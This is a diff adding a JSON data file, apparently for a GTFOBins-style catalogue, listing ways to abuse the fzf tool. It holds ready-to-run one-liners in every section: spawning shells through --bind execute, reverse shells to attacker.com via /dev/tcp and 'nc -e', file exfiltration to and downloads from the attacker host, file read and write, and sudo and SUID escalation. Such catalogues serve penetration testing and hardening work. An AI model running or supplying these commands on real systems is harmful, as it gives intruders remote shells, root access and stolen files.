@@ -1,0 +1,90 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "Press ``<Enter>`` when you enter the fzf panel to receive the shell.",
+        "code": "fzf --bind \"enter:execute(/bin/sh)\"\n"
+      }
+    ],
+    "command": [
+      {
+        "description": "",
+        "code": "export COMMAND='id'\nfzf --bind \"enter:execute($COMMAND)\"\n"
+      },
+      {
+        "description": "Set up port forwarding via SSH or Chisel using ``$LPORT``.",
+        "code": "export LPORT=7777\nexport COMMAND='id'\nfzf --listen=$LPORT\ncurl -X POST localhost:$LPORT -d \"reload($COMMAND)\" # Attacker box\n"
+      }
+    ],
+    "reverse-shell": [
+      {
+        "description": "Run ``nc -l -p 12345`` on the attacker box, then press ``<Enter>`` in the fzf panel to receive the shell.",
+        "code": "export RHOST=attacker.com\nexport RPORT=12345\nfzf --bind \"enter:execute(/bin/sh -i >& /dev/tcp/$RHOST/$RPORT 0>&1)\"\n"
+      },
+      {
+        "description": "Set up port forwarding via SSH or Chisel using ``$LPORT``, then run ``nc -l -p 12345`` on the attacker box to receive the shell. It only works with the traditional version of ``nc``.",
+        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LPORT=7777\nfzf --listen=$LPORT\ncurl -X POST localhost:$LPORT -d \"reload(nc $RHOST $RPORT -e /bin/sh)\" # Attacker box\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "Send local file using a TCP connection. Run ``nc -l -p 12345 > \"file_to_save\"`` on the attacker box to collect the file.",
+        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nfzf --bind \"enter:execute(cat $LFILE > /dev/tcp/$RHOST/$RPORT)\"\n"
+      },
+      {
+        "description": "Set up port forwarding via SSH or Chisel using ``$LPORT``, then run ``nc -l -p 12345 > \"file_to_save\"`` on the attacker box to collect the file.",
+        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LPORT=7777\nexport LFILE=file_to_send\nfzf --listen=$LPORT\ncurl -X POST localhost:$LPORT -d \"reload(cat $LFILE > /dev/tcp/$RHOST/$RPORT)\" # Attacker box\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch remote file using a TCP connection. Run ``nc -l -p 12345 < \"file_to_send\"`` on the attacker box to send the file.",
+        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nfzf --bind \"enter:execute(cat < /dev/tcp/$RHOST/$RPORT > $LFILE)\"\n"
+      },
+      {
+        "description": "Set up port forwarding via SSH or Chisel using ``$LPORT``, then run ``nc -l -p 12345 < \"file_to_send\"`` on the attacker box to send the file.",
+        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LPORT=7777\nexport LFILE=file_to_get\nfzf --listen=$LPORT\ncurl -X POST localhost:$LPORT -d \"reload(cat < /dev/tcp/$RHOST/$RPORT > $LFILE)\" # Attacker box\n"
+      }
+    ],
+    "file-write": [
+      {
+        "description": "Press ``<Enter>`` and then ``<Esc>`` when you enter the fzf panel to write the file.",
+        "code": "export LFILE=file_to_write\nfzf --bind \"enter:execute(echo 'DATA' > $LFILE)\"\n"
+      },
+      {
+        "description": "Set up port forwarding via SSH or Chisel using ``$LPORT``.",
+        "code": "export LPORT=7777\nexport LFILE=file_to_write\nfzf --listen=$LPORT\ncurl -X POST localhost:$LPORT -d \"reload(echo 'DATA' > $LFILE)\" # Attacker box\n"
+      }
+    ],
+    "file-read": [
+      {
+        "description": "Press ``<Enter>`` and then ``<Esc>`` when you enter the fzf panel to read the file.",
+        "code": "export LFILE=file_to_read\nfzf --bind \"enter:execute(/bin/cat $LFILE)\"\n"
+      },
+      {
+        "description": "Set up port forwarding via SSH or Chisel using ``$LPORT``.",
+        "code": "export LPORT=7777\nexport LFILE=file_to_read\nfzf --listen=$LPORT\ncurl -X POST localhost:$LPORT -d \"reload(/bin/cat $LFILE)\" # Attacker box\n"
+      }
+    ],
+    "suid": [
+      {
+        "description": "Press ``<Enter>`` when you enter the fzf panel to receive the shell. It only works on Ubuntu.",
+        "code": "./fzf --bind \"enter:execute(/bin/sh)\"\n"
+      },
+      {
+        "description": "Set up port forwarding via SSH or Chisel using ``$LPORT``, then run ``nc -l -p 12345`` on the attacker box to receive the shell. It only works on Ubuntu and with the traditional version of ``nc``.",
+        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LPORT=7777\n./fzf --listen=$LPORT\ncurl -X POST localhost:$LPORT -d \"reload(nc $RHOST $RPORT -e /bin/sh)\" # Attacker box\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "Press ``<Enter>`` when you enter the fzf panel to receive the shell.",
+        "code": "sudo fzf --bind \"enter:execute(/bin/sh)\"\n"
+      },
+      {
+        "description": "Set up port forwarding via SSH or Chisel using ``$LPORT``, then run ``nc -l -p 12345`` on the attacker box to receive the shell. It only works with the traditional version of ``nc``.",
+        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LPORT=7777\nsudo fzf --listen=$LPORT\ncurl -X POST localhost:$LPORT -d \"reload(nc $RHOST $RPORT -e /bin/sh)\" # Attacker box\n"
+      }
+    ]
+  }
+}
